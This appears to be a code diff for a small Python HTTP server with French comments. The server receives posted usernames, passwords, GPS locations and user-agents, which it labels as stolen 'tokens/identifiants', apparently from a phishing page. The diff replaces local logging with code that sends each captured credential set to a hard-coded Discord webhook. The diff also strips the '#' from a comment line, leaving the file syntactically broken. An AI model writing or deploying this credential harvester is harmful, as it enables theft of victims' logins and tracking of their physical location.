@@ -1,6 +1,9 @@
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
+import urllib.request
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1532531812054863972/UMygn6p24bkcZEhj0xGIDG2VpzqsytWpfkS6VAj7O2CTm82En4jB9BT8OARswdXFsBfW"
 
 class MyHandler(SimpleHTTPRequestHandler):
     def do_POST(self):
@@ -15,14 +18,14 @@ class MyHandler(SimpleHTTPRequestHandler):
             # Horodatage de la réception
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            # Enregistrement dans le fichier identifiants.txt
-            with open('identifiants.txt', 'a', encoding='utf-8') as f:
-                f.write(f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\n")
-                f.write(f"Utilisateur : {data.get('username')}\n")
-                f.write(f"Mot de passe: {data.get('password')}\n")
-                f.write(f"GPS         : {data.get('location')}\n")
-                f.write(f"User-Agent  : {data.get('userAgent')}\n")
-                f.write("=" * 45 + "\n\n")
+            # Envoi vers Discord
+            msg = f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\nUtilisateur : {data.get('username')}\nMot de passe : {data.get('password')}\nGPS : {data.get('location')}\nUser-Agent : {data.get('userAgent')}"
+            payload = json.dumps({"content": msg}).encode('utf-8')
+            req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
+            try:
+                urllib.request.urlopen(req)
+            except Exception as e:
+                print("Erreur envoi Discord:", e)
 
             # Réponse JSON envoyée au navigateur
             self.send_response(200)
@@ -32,8 +35,8 @@ class MyHandler(SimpleHTTPRequestHandler):
         else:
             self.send_error(404, "Page non trouvée")
 
-# Lancement du serveur sur le port 8080
+Lancement du serveur
 server_address = ('', 8080)
 httpd = HTTPServer(server_address, MyHandler)
-print("Serveur lancé avec succès sur http://localhost:8080 ...")
+print("Serveur lancé avec succès sur le port 8080...")
 httpd.serve_forever()
